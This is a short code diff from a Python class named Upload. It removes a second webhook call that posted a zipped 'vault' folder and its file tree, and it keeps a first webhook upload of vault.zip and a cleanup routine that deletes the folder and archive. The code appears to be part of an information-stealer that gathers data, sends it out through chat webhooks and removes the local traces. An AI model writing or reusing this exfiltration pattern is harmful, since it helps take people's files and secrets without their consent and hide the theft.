@@ -67,14 +67,6 @@ class Upload:
             file=File("vault.zip"),
         )
 
-        self.webhook2.send(
-            embed=Embed(
-                title="Vault",
-                description="```" + '\n'.join(self.tree(Path("vault"))) + "```",
-            ),
-            file=File("vault.zip"),
-        )
-
     def clean(self):
         shutil.rmtree("vault")
         os.remove("vault.zip")
